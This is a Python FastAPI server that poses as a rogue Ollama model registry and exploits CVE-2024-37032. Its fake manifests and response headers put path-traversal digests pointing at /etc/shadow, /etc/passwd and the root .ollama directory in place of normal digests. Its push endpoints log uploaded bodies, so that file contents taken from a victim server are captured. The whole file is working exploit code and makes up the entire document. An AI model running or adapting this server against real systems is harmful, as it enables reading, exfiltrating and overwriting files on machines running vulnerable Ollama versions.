from fastapi import FastAPI, Request, Response

HOST = "dev-1.lan.bi0x.com"
app = FastAPI()

@app.get("/")
async def index_get():
    return {"message": "Hello rogue server"}

@app.post("/")
async def index_post(callback_data: Request):
    print(await callback_data.body())
    return {"message": "Hello rogue server"}

# for ollama pull
@app.get("/v2/rogue/bi0x/manifests/latest")
async def fake_manifests():
    return {"schemaVersion":2,"mediaType":"application/vnd.docker.distribution.manifest.v2+json","config":{"mediaType":"application/vnd.docker.container.image.v1+json","digest":"../../../../../../../../../../../../../etc/shadow","size":10},"layers":[{"mediaType":"application/vnd.ollama.image.license","digest":"../../../../../../../../../../../../../../../../../../../tmp/notfoundfile","size":10},{"mediaType":"application/vnd.docker.distribution.manifest.v2+json","digest":"../../../../../../../../../../../../../etc/passwd","size":10},{"mediaType":"application/vnd.ollama.image.license","digest":f"../../../../../../../../../../../../../../../../../../../root/.ollama/models/manifests/{HOST}/rogue/bi0x/latest","size":10}]}

@app.head("/etc/passwd")
async def fake_passwd_head(response: Response):
    response.headers["Docker-Content-Digest"] = "../../../../../../../../../../../../../etc/passwd"
    return ''

@app.get("/etc/passwd", status_code=206)
async def fake_passwd_get(response: Response):
    response.headers["Docker-Content-Digest"] = "../../../../../../../../../../../../../etc/passwd"
    response.headers["E-Tag"] = "\"../../../../../../../../../../../../../etc/passwd\""
    return 'cve-2024-37032-test'

@app.head(f"/root/.ollama/models/manifests/{HOST}/rogue/bi0x/latest")
async def fake_latest_head(response: Response):
    response.headers["Docker-Content-Digest"] = "../../../../../../../../../../../../../root/.ollama/models/manifests/dev-lan.bi0x.com/rogue/bi0x/latest"
    return ''

@app.get(f"/root/.ollama/models/manifests/{HOST}/rogue/bi0x/latest", status_code=206)
async def fake_latest_get(response: Response):
    response.headers["Docker-Content-Digest"] = "../../../../../../../../../../../../../root/.ollama/models/manifests/dev-lan.bi0x.com/rogue/bi0x/latest"
    response.headers["E-Tag"] = "\"../../../../../../../../../../../../../root/.ollama/models/manifests/dev-lan.bi0x.com/rogue/bi0x/latest\""
    return {"schemaVersion":2,"mediaType":"application/vnd.docker.distribution.manifest.v2+json","config":{"mediaType":"application/vnd.docker.container.image.v1+json","digest":"../../../../../../../../../../../../../etc/shadow","size":10},"layers":[{"mediaType":"application/vnd.ollama.image.license","digest":"../../../../../../../../../../../../../../../../../../../tmp/notfoundfile","size":10},{"mediaType":"application/vnd.ollama.image.license","digest":"../../../../../../../../../../../../../etc/passwd","size":10},{"mediaType":"application/vnd.ollama.image.license","digest":f"../../../../../../../../../../../../../../../../../../../root/.ollama/models/manifests/{HOST}/rogue/bi0x/latest","size":10}]}

@app.head("/tmp/notfoundfile")
async def fake_notfound_head(response: Response):
    response.headers["Docker-Content-Digest"] = "../../../../../../../../../../../../../tmp/notfoundfile"
    return ''

@app.get("/tmp/notfoundfile", status_code=206)
async def fake_notfound_get(response: Response):
    response.headers["Docker-Content-Digest"] = "../../../../../../../../../../../../../tmp/notfoundfile"
    response.headers["E-Tag"] = "\"../../../../../../../../../../../../../tmp/notfoundfile\""
    return 'cve-2024-37032-test'

# for ollama push
@app.post("/v2/rogue/bi0x/blobs/uploads/", status_code=202)
async def fake_upload_post(callback_data: Request, response: Response):
    print(await callback_data.body())
    response.headers["Docker-Upload-Uuid"] = "3647298c-9588-4dd2-9bbe-0539533d2d04"
    response.headers["Location"] = f"http://{HOST}/v2/rogue/bi0x/blobs/uploads/3647298c-9588-4dd2-9bbe-0539533d2d04?_state=eBQ2_sxwOJVy8DZMYYZ8wA8NBrJjmdINFUMM6uEZyYF7Ik5hbWUiOiJyb2d1ZS9sbGFtYTMiLCJVVUlEIjoiMzY0NzI5OGMtOTU4OC00ZGQyLTliYmUtMDUzOTUzM2QyZDA0IiwiT2Zmc2V0IjowLCJTdGFydGVkQXQiOiIyMDI0LTA2LTI1VDEzOjAxOjExLjU5MTkyMzgxMVoifQ%3D%3D"
    return ''

@app.patch("/v2/rogue/bi0x/blobs/uploads/3647298c-9588-4dd2-9bbe-0539533d2d04", status_code=202)
async def fake_patch_file(callback_data: Request):
    print('patch')
    print(await callback_data.body())
    return ''

@app.post("/v2/rogue/bi0x/blobs/uploads/3647298c-9588-4dd2-9bbe-0539533d2d04", status_code=202)
async def fake_post_file(callback_data: Request):
    print(await callback_data.body())
    return ''

@app.put("/v2/rogue/bi0x/manifests/latest")
async def fake_manifests_put(callback_data: Request, response: Response):
    print(await callback_data.body())
    response.headers["Docker-Upload-Uuid"] = "3647298c-9588-4dd2-9bbe-0539533d2d04"
    response.headers["Location"] = f"http://{HOST}/v2/rogue/bi0x/blobs/uploads/3647298c-9588-4dd2-9bbe-0539533d2d04?_state=eBQ2_sxwOJVy8DZMYYZ8wA8NBrJjmdINFUMM6uEZyYF7Ik5hbWUiOiJyb2d1ZS9sbGFtYTMiLCJVVUlEIjoiMzY0NzI5OGMtOTU4OC00ZGQyLTliYmUtMDUzOTUzM2QyZDA0IiwiT2Zmc2V0IjowLCJTdGFydGVkQXQiOiIyMDI0LTA2LTI1VDEzOjAxOjExLjU5MTkyMzgxMVoifQ%3D%3D"
    return ''

if __name__ == "__main__":
    import uvicorn
    uvicorn.run(app, host='0.0.0.0', port=80)